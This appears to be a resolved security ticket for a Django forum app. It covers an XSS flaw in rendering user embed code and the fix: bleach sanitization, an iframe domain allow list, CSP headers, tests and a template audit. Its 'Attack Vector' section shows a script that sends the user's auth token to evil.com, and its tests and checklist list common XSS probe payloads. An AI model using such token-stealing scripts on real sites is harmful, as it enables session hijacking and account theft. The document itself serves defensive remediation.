# Fix XSS Vulnerability in Forum Embed Code

**Status**: ✅ RESOLVED
**Priority**: 🔴 P1 - CRITICAL
**Category**: Security
**Effort**: 3-4 hours
**Deadline**: Immediate
**Resolved Date**: 2025-10-17
**PR**: #14
**Commit**: a0361df
**CVE**: CVE-2024-XSS-002

## Problem

User-supplied embed code is rendered with Django's `|safe` filter, allowing arbitrary JavaScript execution and bypassing all XSS protections.

## Location

`templates/forum_integration/blocks/embed_block.html:14`

## Current Code

```django
{{ value.embed_code|safe }}  <!-- CRITICAL XSS -->
```

## Attack Vector

```html
<!-- Attacker submits as embed code: -->
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('authToken'))
</script>
```

## Impact

- Token theft (compounded by JWT in localStorage)
- Session hijacking
- Malware distribution via forum posts
- Phishing attacks against users
- Full account compromise

## Solution

1. Remove `|safe` filter from template
2. Install and configure `bleach` library for HTML sanitization
3. Whitelist only safe HTML tags (iframe, video, img)
4. Add Content-Security-Policy headers
5. Audit all other uses of `|safe` in templates

## Implementation Steps

### Step 1: Install bleach

```bash
pip install bleach
echo "bleach==6.1.0" >> requirements.txt
```

### Step 2: Create sanitization utility

```python
# apps/forum_integration/utils/sanitization.py
import bleach
from bleach.css_sanitizer import CSSSanitizer

ALLOWED_TAGS = [
    'iframe', 'video', 'audio', 'img', 'a',
    'p', 'br', 'strong', 'em', 'u', 'blockquote'
]

ALLOWED_ATTRIBUTES = {
    'iframe': ['src', 'width', 'height', 'frameborder', 'allowfullscreen'],
    'video': ['src', 'width', 'height', 'controls', 'poster'],
    'audio': ['src', 'controls'],
    'img': ['src', 'alt', 'width', 'height'],
    'a': ['href', 'title'],
}

ALLOWED_PROTOCOLS = ['http', 'https']

# Whitelist for trusted embed domains
ALLOWED_IFRAME_DOMAINS = [
    'youtube.com',
    'www.youtube.com',
    'player.vimeo.com',
    'codepen.io',
    'replit.com',
]

css_sanitizer = CSSSanitizer(allowed_css_properties=['width', 'height'])

def sanitize_embed_code(html):
    """Sanitize user-supplied embed code"""

    # First pass: bleach sanitization
    clean_html = bleach.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        protocols=ALLOWED_PROTOCOLS,
        strip=True,
        css_sanitizer=css_sanitizer,
    )

    # Second pass: validate iframe domains
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(clean_html, 'html.parser')

    for iframe in soup.find_all('iframe'):
        src = iframe.get('src', '')
        domain = urlparse(src).netloc

        if domain not in ALLOWED_IFRAME_DOMAINS:
            iframe.decompose()  # Remove untrusted iframe

    return str(soup)
```

### Step 3: Create template filter

```python
# apps/forum_integration/templatetags/forum_filters.py
from django import template
from apps.forum_integration.utils.sanitization import sanitize_embed_code

register = template.Library()

@register.filter(name='safe_embed')
def safe_embed(value):
    """Sanitize and render embed code safely"""
    if not value:
        return ''
    return sanitize_embed_code(value)
```

### Step 4: Update template

```django
<!-- templates/forum_integration/blocks/embed_block.html -->
{% load forum_filters %}

<div class="embed-block">
    {{ value.embed_code|safe_embed|safe }}
    <!-- Now safe because sanitized before |safe -->
</div>
```

### Step 5: Add CSP headers

```python
# learning_community/settings/base.py
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")  # For Tailwind
CSP_IMG_SRC = ("'self'", "data:", "https:")
CSP_FRAME_SRC = (
    "https://youtube.com",
    "https://www.youtube.com",
    "https://player.vimeo.com",
    "https://codepen.io",
    "https://replit.com",
)

MIDDLEWARE = [
    'csp.middleware.CSPMiddleware',  # Add django-csp
    # ... other middleware
]
```

### Step 6: Audit all |safe usage

```bash
# Find all uses of |safe filter
rg '\|safe' templates/
```

For each occurrence, evaluate:
- Is the data user-controlled? → Must sanitize
- Is the data from trusted source? → Document why safe
- Can we avoid |safe entirely? → Prefer this

### Step 7: Add validation to model

```python
# apps/forum_integration/models.py
from apps.forum_integration.utils.sanitization import sanitize_embed_code

class EmbedBlock(blocks.StructBlock):
    embed_code = blocks.TextBlock(
        required=True,
        help_text="Paste embed code from YouTube, Vimeo, etc."
    )

    def clean(self, value):
        value = super().clean(value)
        # Sanitize on save
        if 'embed_code' in value:
            value['embed_code'] = sanitize_embed_code(value['embed_code'])
        return value
```

## Testing

```python
# tests/test_embed_sanitization.py
from apps.forum_integration.utils.sanitization import sanitize_embed_code

class EmbedSanitizationTests(TestCase):
    def test_blocks_script_tags(self):
        """Ensure script tags are stripped"""
        malicious = '<script>alert("XSS")</script>'
        result = sanitize_embed_code(malicious)
        self.assertNotIn('<script>', result)
        self.assertNotIn('alert', result)

    def test_blocks_event_handlers(self):
        """Ensure event handlers are stripped"""
        malicious = '<img src="x" onerror="alert(1)">'
        result = sanitize_embed_code(malicious)
        self.assertNotIn('onerror', result)

    def test_allows_youtube_iframe(self):
        """Ensure YouTube embeds are allowed"""
        youtube = '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>'
        result = sanitize_embed_code(youtube)
        self.assertIn('youtube.com', result)

    def test_blocks_untrusted_iframe(self):
        """Ensure untrusted iframes are blocked"""
        untrusted = '<iframe src="https://evil.com/malware"></iframe>'
        result = sanitize_embed_code(untrusted)
        self.assertNotIn('evil.com', result)

    def test_blocks_javascript_protocol(self):
        """Ensure javascript: protocol is blocked"""
        malicious = '<a href="javascript:alert(1)">Click</a>'
        result = sanitize_embed_code(malicious)
        self.assertNotIn('javascript:', result)
```

## Verification

- [ ] bleach installed and configured
- [ ] Sanitization utility created with whitelist
- [ ] Template filter created and applied
- [ ] |safe removed from direct user input
- [ ] CSP headers configured
- [ ] All |safe usage audited
- [ ] Comprehensive tests added
- [ ] Manual testing with XSS payloads

## Manual Testing Checklist

Test these XSS payloads to verify protection:

```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">Click</a>
<body onload=alert(1)>
```

All should be sanitized/removed.

## References

- OWASP: Cross-Site Scripting (XSS)
- CWE-79: Improper Neutralization of Input During Web Page Generation
- Django Security: https://docs.djangoproject.com/en/stable/topics/security/
- Bleach Documentation: https://bleach.readthedocs.io/
- Comprehensive Security Audit 2025, Finding #2
